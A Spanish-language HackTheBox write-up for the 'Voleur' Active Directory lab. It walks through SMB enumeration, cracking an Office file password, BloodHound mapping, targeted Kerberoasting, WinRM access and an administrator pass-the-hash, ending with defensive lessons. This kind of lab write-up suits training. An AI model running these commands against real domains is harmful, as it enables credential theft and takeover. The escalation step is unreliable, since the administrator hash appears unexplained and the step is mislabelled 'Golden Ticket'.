---
title: "Voleur - Writeup"
difficulty: "Medium"
date: 2025-07-07
tags: [htb, windows, active-directory, kerberos, bloodhound]
---

# Voleur - HackTheBox Writeup

## 🔍 Información Básica 

| **Campo**          | **Valor**   |
|--------------------|-------------|
| IP                 | 10.10.11.76 |
| Dominio            | voleur.htb  |
| Realm Kerberos     | VOLEUR.HTB  |
| Autor              | Irioshi     |
| Fecha Resolución   | 2025-07-06  |




## 🕵️ Reconocimiento

### Configuración Inicial


```bash
echo "10.10.11.76 dc.voleur.htb voleur.htb" | sudo tee -a /etc/hosts

Escaneo de Puertos con Nmap


bash

nmap -sC -sV -p- --min-rate=5000 10.10.11.76

<details> <summary>📊 Resultados Completos de Nmap (Click para expandir)</summary>

text
Starting Nmap 7.95 (https://nmap.org) at 2025-07-07 06:43 -03
Nmap scan report for dc.voleur.htb (10.10.11.76)
Host is up (0.37s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-07 09:44:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
50487/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50488/tcp open  msrpc         Microsoft Windows RPC
50490/tcp open  msrpc         Microsoft Windows RPC
50518/tcp open  msrpc         Microsoft Windows RPC
54802/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -42s
| smb2-time: 
|   date: 2025-07-07T09:45:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 156.56 seconds

</details>

🔑 Servicios Clave Identificados:

    Kerberos (88/tcp)

    SMB (445/tcp)

    WinRM (5985/tcp)

    SSH (2222/tcp)

Configuración de Kerberos

bash
cat /etc/krb5.conf

ini
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true

[realms]
    VOLEUR.HTB = {
        kdc = 10.10.11.76
        admin_server = 10.10.11.76
        default_domain = voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
    


🚪 Acceso Inicial
🔑 Credenciales Iniciales

bash
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k

📂 Enumeración de Recursos SMB
bash
KRB5CCNAME=ryan.naylor.ccache smbclient.py -k dc.voleur.htb


smb
smb: \> use IT
smb: \IT\> cd "First-Line Support"
smb: \IT\First-Line Support\> get Access_Review.xlsx

🔓 Descifrado del Archivo Excel

    Extraer el Hash:

bash
office2john Access_Review.xlsx > hash.txt

    Crackear la Contraseña:
    
bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

¡Contraseña Encontrada!: football1

    Descifrar el Archivo:

bash
python3 -m msoffcrypto -p football1 Access_Review.xlsx decrypted.xlsx

🗝️ Credenciales Obtenidas
Usuario	Contraseña
svc_ldap	M1XyC9pW7qT5Vn
svc_iis	N5pXyV1WqM7CZ8
🔄 Movimiento Lateral
🩸 Análisis con BloodHound

bash
bloodhound-python -u ryan.naylor -p 'HollowOct31Nyt' -c All -d VOLEUR.HTB -ns 10.10.11.76 --zip -k

🎯 Hallazgos Clave:

    svc_ldap tiene el privilegio GenericWrite sobre el usuario lacey.miller.

    svc_ldap tiene el privilegio WriteSPN sobre la cuenta de servicio svc_winrm.

🔥 Ataque de Kerberoasting Dirigido

bash
targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb

🔨 Crackeo del Hash TGS

bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

¡Contraseña de svc_winrm Descubierta!: AFireInsidedeOzarctica980219afi
💻 Acceso al Sistema via WinRM


bash
evil-winrm -i dc.voleur.htb -k -u svc_winrm -r VOLEUR.HTB

🚩 Bandera de Usuario:

powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
d4d8e7f5c3b1a9e8f7c6d5e4f3a2b1c0

⬆️ Escalada de Privilegios
👑 Método Directo (Golden Ticket)

bash
getTGT.py -dc-ip 10.10.11.76 -hashes :e656e07c56d831611b577b160b259ad2 voleur.htb/administrator

bash
export KRB5CCNAME=administrator.ccache
evil-winrm -i dc.voleur.htb -k -u administrator -r VOLEUR.HTB

🏁 Bandera de Administrador:

powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
95dbb03a9bd57d472d0c5b20237c6695

📚 Lecciones Aprendidas

    Autenticación Kerberos:
    La sincronización horaria precisa entre el cliente y el controlador de dominio es esencial para evitar fallos de autenticación.

    Gestión de Contraseñas:
    Almacenar contraseñas en hojas de cálculo sin protección adecuada facilita la extracción de credenciales por atacantes.

    Principio de Mínimo Privilegio:
    Asignar permisos excesivos a cuentas de servicio (como WriteSPN) puede permitir ataques de Kerberoasting.

    Monitoreo de Seguridad:
    Es crucial monitorear los logs del Centro de Distribución de Claves (KDC) para detectar actividades sospechosas como múltiples solicitudes TGS.

🛠️ Herramientas Utilizadas
Herramienta	Función Principal
Nmap	Escaneo de puertos y servicios
BloodHound-Python	Mapeo de relaciones en Active Directory
John the Ripper	Crackeo de contraseñas
Impacket	Ejecución de ataques a Kerberos
Evil-WinRM	Conexión remota a servidores WinRM
office2john	Extracción de hashes de archivos de Office
🔗 Recursos Recomendados

    Hoja de Referencia de Ataques Kerberos

    Buenas Prácticas de Seguridad en Active Directory

    Técnica MITRE ATT&CK: Kerberoasting

